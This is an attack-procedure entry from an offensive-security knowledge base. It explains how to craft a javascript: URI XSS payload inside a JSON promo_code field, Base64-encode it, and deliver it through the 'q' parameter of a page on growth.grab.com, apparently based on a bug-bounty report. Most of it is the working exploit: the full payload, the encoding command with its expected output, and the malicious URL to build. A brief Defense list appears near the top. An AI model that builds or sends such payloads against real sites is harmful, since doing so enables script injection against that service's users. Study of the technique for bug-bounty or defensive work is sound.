---
tags:
  - payload-crafting
  - base64-encoding
  - xss-payload
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/base64-encode-json]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:25.409Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: bf7a8709-1149-43a4-88a4-7d480d1ccfb6
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft and Encode Malicious XSS Payload

## Summary

This procedure covers creating a javascript: URL payload for XSS injection into a JSON field and encoding the modified JSON to Base64 for URL delivery.

## Description

Start with a sample JSON object from the target page, replace the 'promo_code' value with a malicious javascript: string that executes JS (e.g., alert(document.domain)). Re-encode the entire JSON to Base64 to form the 'q' parameter, ensuring the payload evades basic filters by mimicking a referral URL.

## Requirements

1. Text editor for JSON modification
2. Base64 encoding capability (command-line or browser)
3. Knowledge of javascript: URI scheme

## Defense

Defensive measures and detection strategies:

- Blacklist javascript: and data: schemes in URL fields
- Encode/escape JSON fields before processing
- Implement URL validation libraries

## Objectives

1. Inject executable code without breaking JSON structure
2. Obfuscate payload via Base64
3. Prepare deliverable malicious URL

## Instructions

### Step 1: Modify JSON Payload

**Context**: Inject the XSS string into 'promo_code'.

Create or edit JSON: {"name": "Test HackerOne", "start_date": "01.01.2018", "leanplum_id": "test", "rides": "200", "places": "20", "distance": 500, "cancel_times": "0", "days": "100", "promo_code": "javascript://r.grab.com/test%0aalert(document.domain)", "prf_reward": "10"}.

> Use %0a for line breaks to chain URL and JS.

### Step 2: Encode to Base64

**Context**: Convert the JSON to Base64 for the 'q' parameter.

Execute [[commands/base64-encode-json]]:

```bash
echo -n '{"name": "Test HackerOne", "start_date": "01.01.2018", "leanplum_id": "test", "rides": "200", "places": "20", "distance": 500, "cancel_times": "0", "days": "100", "promo_code": "javascript://r.grab.com/test%0aalert(document.domain)", "prf_reward": "10"}' | base64
```

> Expected: eyJuYW1lIjogIlRlc3QgSGFja2VyT25lIiwgInN0YXJ0X2RhdGUiOiAiMDEuMDEuMjAxOCIsICJsZWFucGx1bV9pZCI6ICJ0ZXN0IiwgInJpZGVzIjogIjIwMCIsICJwbGFjZXMiOiAiMjAiLCAiZGlzdGFuY2UiOiA1MDAsICJjYW5jZWxfdGltZXMiOiAiMCIsICJkYXlzIjogIjEwMCIsICJwcm9tb19jb2RlIjogImphdmFzY3JpcHQ6Ly9yLmdyYWIuY29tL3Rlc3QlMGFhbGVydChkb2N1bWVudC5kb21haW4pIiwgInByZl9yZXdhcmQiOiAiMTAifQ==

### Step 3: Construct Malicious URL

**Context**: Append encoded string to base URL.

Form: https://growth.grab.com/valentine/active/my.html?q=<encoded_base64>.

> Test in browser to ensure no immediate errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/base64-encode-json]]

## Tools Used


## Tags

- [[payload-crafting]]
- [[xss-payload]]
